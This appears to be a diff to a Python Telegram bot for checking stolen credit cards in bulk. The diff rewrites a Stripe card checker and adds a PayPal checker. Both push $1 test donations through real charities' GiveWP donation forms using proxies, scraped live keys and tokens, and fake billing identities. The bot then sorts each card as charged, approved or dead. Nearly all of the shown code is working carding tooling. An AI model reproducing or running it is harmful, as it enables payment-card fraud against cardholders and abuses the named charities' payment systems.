@@ -1,6 +1,6 @@
 # ==============================================================================
-# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐒𝐓𝐑𝐈𝐏𝐄 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (CUSTOM ANIMATED EMOJI IDs, GLOBAL CHARGED FONT, STRICT STRIPE ENGINE, FORCED GIFS)
+# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘, 𝐒𝐓𝐑𝐈𝐏𝐄 & 𝐏𝐀𝐘𝐏𝐀𝐋 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
+# (CUSTOM ANIMATED EMOJIS, CHARGED FONT, ASYNC APIS, STRICT EXACT RESPONSES)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -11,6 +11,7 @@ import time
 import json
 import re
 import io
+import base64
 import logging
 import sys
 from html import unescape
@@ -96,7 +97,7 @@ def sf(text) -> str:
     return res
 
 def unsf(text) -> str:
-    """Reverts Mathematical Sans-Serif Bold back to standard ASCII for exact database matching"""
+    """Reverts Mathematical Sans-Serif Bold back to standard ASCII for database checking"""
     if text is None: return ""
     res = ""
     for c in str(text):
@@ -407,7 +408,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== STRICT CHECKER API (SHOPIFY + STRIPE 1$) ======================
+# ====================== STRICT CHECKER APIS ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -418,14 +419,14 @@ async def get_bin_info(bin_code):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-async def check_stripe_donate_api(card, proxy, session):
-    """STRICT Stripe Donate 1$ Gateway - Zero False Positives"""
+async def check_stripe_donate_api(card, proxy):
+    """STRICT Stripe 1$ Gateway with Isolated Sessions & Exact Outputs"""
     try:
         parts = card.split('|')
-        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card}
+        if len(parts) < 4: return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
         yy_short = yy if len(yy) == 2 else yy[-2:]
-        email = f'Ahmed{random.randint(100,999)}@gmail.com'
+        email = f'Ahmed{random.randint(100,9999)}@gmail.com'
         
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
@@ -434,124 +435,194 @@ async def check_stripe_donate_api(card, proxy, session):
         base_url = 'https://printsofhope.org'
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
         
-        # 1. Fetch Form Tokens
-        headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
-        async with session.get(site_url, headers=headers_get, proxy=proxy_str, timeout=30) as r1:
-            html = await r1.text()
-            
-        if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
-            fid_match = re.search(r'form-id[=]+(\d+)', html)
-            if fid_match:
-                iframe_url = f'{base_url}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}'
-                async with session.get(iframe_url, headers=headers_get, proxy=proxy_str, timeout=30) as r2:
-                    html = await r2.text()
-
-        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
-        fi = re.search(r'name="give-form-id" value="(.*?)"', html)
-        nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
-        pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
-        sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
-
-        if not all([fp, fi, nc, pk]):
-            return {'status': 'Site Error', 'message': "Token Extraction Failed", 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        fp_v, fi_v, nc_v, pk_v = fp.group(1), fi.group(1), nc.group(1), pk.group(1)
-        sa_v = sa.group(1) if sa else ''
-        sa_param = f'&_stripe_account={sa_v}' if sa_v else ''
-
-        # 2. Ajax Initialization
-        headers_ajax = {'origin': base_url, 'referer': site_url, 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
-        data_ajax = {
-            'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
-            'give-form-title': 'Give a Donation', 'give-current-url': site_url,
-            'give-form-url': site_url, 'give-form-minimum': '1.00',
-            'give-form-maximum': '999999.99', 'give-form-hash': nc_v,
-            'give-price-id': 'custom', 'give-amount': '1.00',
-            'give_stripe_payment_method': '', 'payment-mode': 'stripe',
-            'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
-            'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
-            'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
-            'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
-            'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
-        }
-        async with session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=30) as r3:
-            await r3.text()
-
-        # 3. Stripe Tokenization (Early Catch)
-        headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
-        stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
-
-        async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_str, timeout=30) as r4:
-            sr = await r4.json()
-
-        if 'error' in sr:
-            em = sr['error'].get('message', 'Unknown Error')
-            ec = sr['error'].get('code', '')
-            ed = sr['error'].get('decline_code', '')
-            err_msg = f"{em} ({ed})" if ed else em
-            
-            rl = err_msg.lower()
-            if 'insufficient' in rl or 'not enough' in rl or ed == 'insufficient_funds': 
-                return {'status': 'Insufficient', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or ec in ['incorrect_cvc', 'incorrect_zip'] or ed in ['incorrect_cvc', 'incorrect_zip']: 
-                return {'status': 'Approved', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'rate_limit' in rl or 'processing error' in rl or ec == 'rate_limit': 
-                return {'status': 'Site Error', 'message': err_msg, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            else: 
-                return {'status': 'Dead', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        pm_id = sr['id']
-
-        # 4. Strict Final Processing (The Core Fix)
-        headers_final = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': site_url, 'upgrade-insecure-requests': '1', 'user-agent': ua}
-        params_final = {'payment-mode': 'stripe', 'form-id': fi_v}
-        data_final = data_ajax.copy()
-        data_final['give_stripe_payment_method'] = pm_id
-        data_final.pop('give_ajax', None)
-        
-        async with session.post(site_url, params=params_final, headers=headers_final, data=data_final, proxy=proxy_str, timeout=30, allow_redirects=True) as r5:
-            final_text = await r5.text()
-            current_url = str(r5.url).lower()
-
-        # Rule A: Explicit WordPress/GiveWP Errors (Highest Priority)
-        if 'give_error' in final_text.lower() or 'give_errors' in final_text.lower():
-            err_matches = re.findall(r'<li[^>]*>(.*?)</li>', final_text, re.IGNORECASE)
-            if not err_matches:
-                err_matches = re.findall(r'class="give_error[^>]*>(.*?)</div>', final_text, re.IGNORECASE)
+        # 1. ISOLATED SESSION
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
+            headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
+            async with local_session.get(site_url, headers=headers_get, proxy=proxy_str, timeout=20) as r1:
+                html = await r1.text()
                 
-            if err_matches:
-                clean_error = " | ".join([unescape(re.sub(r'<[^>]+>', '', em)).strip() for em in err_matches])
-            else:
-                clean_error = "Card Declined"
+            if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
+                fid_match = re.search(r'form-id[=]+(\d+)', html)
+                if fid_match:
+                    iframe_url = f'{base_url}/?givewp-route=donation-form-view&form-id={fid_match.group(1)}'
+                    async with local_session.get(iframe_url, headers=headers_get, proxy=proxy_str, timeout=20) as r2:
+                        html = await r2.text()
+
+            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
+            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
+            sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
+
+            if not all([fp, fi, nc, pk]):
+                return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+            fp_v, fi_v, nc_v, pk_v = fp.group(1), fi.group(1), nc.group(1), pk.group(1)
+            sa_v = sa.group(1) if sa else ''
+            sa_param = f'&_stripe_account={sa_v}' if sa_v else ''
+
+            headers_ajax = {'origin': base_url, 'referer': site_url, 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
+            data_ajax = {
+                'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
+                'give-form-title': 'Give a Donation', 'give-current-url': site_url,
+                'give-form-url': site_url, 'give-form-minimum': '1.00',
+                'give-form-maximum': '999999.99', 'give-form-hash': nc_v,
+                'give-price-id': 'custom', 'give-amount': '1.00',
+                'give_stripe_payment_method': '', 'payment-mode': 'stripe',
+                'give_first': 'Ahmed', 'give_last': 'Ahmed', 'give_email': email,
+                'give_comment': '', 'card_name': 'Ahmed', 'billing_country': 'US',
+                'card_address': 'Ahmed sj', 'card_address_2': '', 'card_city': 'tomrr',
+                'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
+                'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true',
+            }
+            async with local_session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=20) as r3:
+                await r3.text()
+
+            headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
+            stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
+
+            async with local_session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=stripe_data, proxy=proxy_str, timeout=20) as r4:
+                sr = await r4.json()
+
+            if 'error' in sr:
+                err_code = sr['error'].get('code', '')
+                err_decline = sr['error'].get('decline_code', '')
+                err_msg = sr['error'].get('message', '').lower()
                 
-            rl = clean_error.lower()
+                if 'insufficient' in err_msg or err_code == 'insufficient_funds' or err_decline == 'insufficient_funds': 
+                    return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+                elif 'incorrect' in err_msg or err_code in ['incorrect_cvc', 'incorrect_zip'] or err_decline in ['incorrect_cvc', 'incorrect_zip']: 
+                    return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+                elif err_code == 'rate_limit': 
+                    return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+                else: 
+                    return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+            pm_id = sr['id']
+
+            headers_final = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': site_url, 'upgrade-insecure-requests': '1', 'user-agent': ua}
+            params_final = {'payment-mode': 'stripe', 'form-id': fi_v}
+            data_final = data_ajax.copy()
+            data_final['give_stripe_payment_method'] = pm_id
+            data_final.pop('give_ajax', None)
+            
+            async with local_session.post(site_url, params=params_final, headers=headers_final, data=data_final, proxy=proxy_str, timeout=30, allow_redirects=True) as r5:
+                final_text = await r5.text()
+                current_url = str(r5.url).lower()
+
+            rl = final_text.lower()
+            
             if 'insufficient funds' in rl or 'not enough' in rl: 
-                return {'status': 'Insufficient', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
             elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or 'zip' in rl or 'cvc' in rl or 'approved' in rl: 
-                return {'status': 'Approved', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif any(k in rl for k in ['minimum donation', 'robot', 'captcha', 'security check', 'processing error']): 
-                return {'status': 'Site Error', 'message': clean_error, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            else: 
-                return {'status': 'Dead', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        # Rule B: Generic Dead Phrases
-        if 'declined' in final_text.lower() or 'payment failed' in final_text.lower():
-            return {'status': 'Dead', 'message': 'Payment Failed / Declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
-        # Rule C: Strict Charged Logic (Must have explicit receipt/confirmation flag)
-        if 'donation-receipt' in final_text.lower() or 'donation-confirmation' in final_text.lower() or 'donation-confirmation' in current_url or 'receipt' in current_url:
-            return {'status': 'Charged', 'message': 'Donation Successful', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+                return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
             
-        success_phrases = ['thank you for your donation', 'donation receipt', 'payment complete', 'payment succeeded']
-        for phrase in success_phrases:
-            if phrase.lower() in final_text.lower():
-                return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            if 'donation-receipt' in rl or 'donation-confirmation' in rl or 'receipt' in current_url or 'thank you for your donation' in rl or 'payment succeeded' in rl:
+                if 'give_error' not in rl and 'give_errors' not in rl:
+                    return {'status': 'Charged', 'message': 'Charged', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
-        # Rule D: Ultimate Fallback (If not explicitly charged, it is DEAD. Never assume charged.)
-        return {'status': 'Dead', 'message': 'Gateway Declined (No Confirmation)', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
-    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-    except Exception as e: return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:20]}', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+    except Exception: return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+
+async def check_paypal_donate_api(card, proxy):
+    """STRICT PayPal 1$ Gateway with Isolated Sessions & Exact Outputs"""
+    try:
+        parts = card.split('|')
+        if len(parts) < 4: return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        if "20" in yy and len(yy) == 4: yy = yy.split("20")[1]
+        elif len(yy) == 4: yy = yy[-2:]
+        
+        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
+        if proxy_str and not proxy_str.startswith('http'): proxy_str = f"http://{proxy_str}"
+
+        price = "1"
+        urll = "https://www.callahandogs.com/donate/"
+        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
+
+        # 1. ISOLATED SESSION
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
+            
+            headers_get = {'User-Agent': ua}
+            async with local_session.get(urll, headers=headers_get, proxy=proxy_str, timeout=20) as r1:
+                text1 = await r1.text()
+
+            try:
+                vaa = re.search(r'name="give-form-hash" value="(.*?)"', text1).group(1)
+                vaa2 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text1).group(1)
+                vaa3 = re.search(r'name="give-form-id" value="(.*?)"', text1).group(1)
+                vaa4 = re.search(r'"data-client-token":"(.*?)"', text1).group(1)
+                decc = base64.b64decode(vaa4).decode('utf-8')
+                au = re.search(r'"accessToken":"(.*?)"', decc).group(1)
+            except Exception:
+                return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+            url2 = "https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
+            payload2 = {
+                'give-honeypot': '', 'give-form-id-prefix': vaa2, 'give-form-id': vaa3,
+                'give-form-title': 'Make a Donation', 'give-current-url': urll, 'give-form-url': urll,
+                'give-form-minimum': price, 'give-form-maximum': '1000000', 'give-form-hash': vaa,
+                'give-price-id': '0', 'give-amount': price, 'payment-mode': 'paypal-commerce',
+                'give_title': 'Mr.', 'give_first': 'Gustave', 'give_last': 'Bruen',
+                'give_company_option': 'no', 'give_company_name': '', 'give_email': f'jdvdjsgwhsgy{random.randint(100,999)}@gmail.com',
+                'give_comment': '', 'card_name': 'Tome', 'card_exp_month': '', 'card_exp_year': '',
+                'billing_country': 'US', 'card_address': 'RTS 58/3 Bark Camp', 'card_address_2': '',
+                'card_city': 'Alkol', 'card_state': 'WV', 'card_zip': '25501', 'give-gateway': 'paypal-commerce'
+            }
+            async with local_session.post(url2, data=payload2, headers=headers_get, proxy=proxy_str, timeout=20) as r2:
+                try:
+                    j2 = await r2.json()
+                    idd = j2['data']['id']
+                except:
+                    return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+            url3 = f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source"
+            payload3 = {
+                "payment_source": {
+                    "card": {
+                        "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
+                        "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
+                    }
+                },
+                "application_context": {"vault": False}
+            }
+            headers3 = {
+                'User-Agent': ua, 'Accept-Encoding': "gzip, deflate, br, zstd", 'Content-Type': "application/json",
+                'authorization': "Bearer " + au, 'braintree-sdk-version': "3.32.0-payments-sdk-dev",
+                'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6"
+            }
+            async with local_session.post(url3, json=payload3, headers=headers3, proxy=proxy_str, timeout=20) as r3:
+                await r3.text()
+
+            url4 = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
+            async with local_session.post(url4, data=payload2, headers=headers_get, proxy=proxy_str, timeout=20) as r4:
+                try: j4 = await r4.json()
+                except: return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+            # Strict Explicit Parsing
+            if j4.get("success") == True:
+                return {'status': 'Charged', 'message': 'Charged', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+            
+            text = str(j4).lower()
+            
+            if 'insufficient' in text or 'not enough' in text or 'balance' in text or 'funds' in text:
+                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+            elif 'cvv' in text or 'cvc' in text or 'zip' in text or 'approved' in text or 'security code' in text or 'not match' in text:
+                return {'status': 'Approved', 'message': 'approved', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+            elif 'rate_limit' in text or 'unavailable' in text:
+                return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+            else:
+                return {'status': 'Dead', 'message': 'card declined', 'card': card, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+    except Exception:
+        return {'status': 'Site Error', 'message': 'card declined', 'card': card, 'retry': True, 'gateway': 'PayPal (1$)', 'price': '1$'}
+
 
 async def check_card_api(card, site, proxy, session, gateway_name):
     try:
@@ -599,8 +670,11 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
         p = random.choice(ap) if ap else None
         
         if gateway_name == "Stripe":
-            r = await check_stripe_donate_api(card, p, session)
+            r = await check_stripe_donate_api(card, p)
             s = "Stripe" 
+        elif gateway_name == "PayPal":
+            r = await check_paypal_donate_api(card, p)
+            s = "PayPal"
         else:
             acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
             if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
@@ -608,7 +682,7 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
             r = await check_card_api(card, s, p, session, gateway_name)
             
         if not r.get('retry'):
-            if gateway_name != "Stripe" and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+            if gateway_name not in ["Stripe", "PayPal"] and r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                 _SITE_ERRORS_COUNT[s] = 0
             return r
         lr = r; await asyncio.sleep(DELAY)
@@ -708,7 +782,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         kb = [
             [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("Stripe (1$)"), callback_data="gate:Stripe", style="success")],
-            [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary")],
+            [InlineKeyboardButton(sf("PayPal (1$)"), callback_data="gate:PayPal", style="primary"), InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary")],
             [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
         ]
         await styled_edit(pm, f"<b>{CE_STAR} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_GEAR} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_ROCKET} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
@@ -1114,7 +1188,10 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 
                 if gate_name == "Stripe":
                     p = random.choice(proxies) if proxies else None
-                    res = await check_stripe_donate_api(card, p, http_session)
+                    res = await check_stripe_donate_api(card, p)
+                elif gate_name == "PayPal":
+                    p = random.choice(proxies) if proxies else None
+                    res = await check_paypal_donate_api(card, p)
                 else:
                     res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, max_retries=2)
                 
@@ -1218,7 +1295,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH STRICT STRIPE 1$ & CHARGED FONT!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH STRICT STRIPE/PAYPAL 1$ & CHARGED FONT!")
     
     while True:
         try:
